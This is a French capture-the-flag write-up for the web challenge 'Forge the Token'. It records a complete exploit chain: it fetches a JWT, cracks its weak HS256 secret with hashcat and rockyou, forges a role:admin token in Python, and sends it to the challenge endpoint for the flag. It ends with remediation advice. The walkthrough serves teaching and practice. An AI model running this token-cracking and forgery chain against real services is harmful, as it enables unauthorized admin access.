---
# Imported from Obsidian: csplusplus CTF/Forge the Token.md
title: Forge the Token
category: Web
difficulty: Medium
ctf: csplusplus
date: 2026-10-01
summary: 'En décodant la partie payload (base64url), on obtient :'
tags:
- csplusplus
- web
points: 90
lang: fr
imported: true
---

## Informations

- **Catégorie :** Web Exploitation
- **Difficulté :** Medium
- **Points :** 90
- **Auteur du write-up :** 3ch0
- **Flag :** `cspp{jwt_weak_hs256_secret}`

> **Énoncé :** A login API hands out JSON Web Tokens. It's signed HS256 with a laughably weak secret. Crack the secret, then forge a new token with `"role":"admin"` and send it back.
> **Endpoint :** `GET` / `POST` `https://api.csplusplus.com/api/ctf/x/jwt`

---

## 1. Récupération du token initial

On demande un token à l'API :

```bash
curl https://api.csplusplus.com/api/ctf/x/jwt
```

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTcxNzAwMDAwMH0.SZ6rROjWsV0epw-FVer2E5Dl3zZR97tH6OkkNVEVOjA",
  "hint": "... HS256 with a very common secret. Forge role:\"admin\" ..."
}
```

En décodant la partie payload (base64url), on obtient :

```json
{ "user": "guest", "role": "user", "iat": 1717000000 }
```

L'objectif est clair : passer `"role": "user"` à `"role": "admin"`. Mais changer le payload invalide la signature — il faut donc connaître le **secret de signature HS256** pour re-signer.

---

## 2. Crack du secret HS256 (hashcat)

On enregistre le token dans un fichier :

```bash
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTcxNzAwMDAwMH0.SZ6rROjWsV0epw-FVer2E5Dl3zZR97tH6OkkNVEVOjA' > jeton.txt
```

On lance hashcat en **mode 16500 (JWT)** avec rockyou :

```bash
hashcat -m 16500 jeton.txt /usr/share/wordlists/rockyou.txt -O
```

> ⚠️ **Ordre des arguments :** hashcat attend `hashcat [options] <fichier_hash> <wordlist>`. Lancer la wordlist sans fichier de hash (`hashcat -m 16500 rockyou.txt`) fait échouer le chargement (« No hashes loaded » / segfault sur machine à faible RAM). L'option `-O` (optimized kernel) réduit l'empreinte mémoire.

Résultat — cracké en moins d'une seconde :

```text
...SZ6rROjWsV0epw-FVer2E5Dl3zZR97tH6OkkNVEVOjA:secret
Status...........: Cracked
```

> **Secret trouvé : `secret`** — un des mots les plus triviaux qui soit.

![Screenshot](./images/obsidian/forge-the-token/pasted-image-20261001101359.png)

---

## 3. Forge du token admin

Connaissant le secret, on forge un nouveau token avec `"role":"admin"`. On peut le faire sur [jwt.io](https://jwt.io) (coller le secret `secret` dans le champ de vérification) ou en Python :

```python
import jwt   # pip install pyjwt
token = jwt.encode(
    {"user": "guest", "role": "admin", "iat": 1717000000},
    "secret",
    algorithm="HS256"
)
print(token)
```

Token forgé (payload avec `role:admin`) :

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MTcwMDAwMDB9.yyKE13brpkrzlOq9OMzXoGOv-Vyg9LxxldsIuP-xLq0
```

---

## 4. Envoi du token et récupération du flag

On renvoie le token forgé dans l'en-tête `Authorization` :

```bash
curl -X POST https://api.csplusplus.com/api/ctf/x/jwt \
     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MTcwMDAwMDB9.yyKE13brpkrzlOq9OMzXoGOv-Vyg9LxxldsIuP-xLq0"
```

```json
{"ok":true,"flag":"cspp{jwt_weak_hs256_secret}"}
```

---

## Récapitulatif de la chaîne d'exploitation

1. **`GET`** → récupération d'un JWT `role:user` signé HS256.
2. **hashcat -m 16500** → crack du secret → `secret`.
3. **Forge** → nouveau token `role:admin` re-signé avec le secret.
4. **`POST`** avec le token forgé → flag.

> **Concept clé :** la sécurité d'un JWT HS256 repose **entièrement** sur la force de son secret. Un secret faible (mot de dictionnaire) se crack en quelques millisecondes, permettant de forger n'importe quel token et d'usurper n'importe quel rôle.
>
> **Remédiation :** utiliser un secret long et aléatoire (≥ 32 octets générés cryptographiquement), le stocker hors du code, et valider côté serveur l'algorithme attendu (refuser `alg:none` et les substitutions RS256→HS256).

---

***— 3ch0***
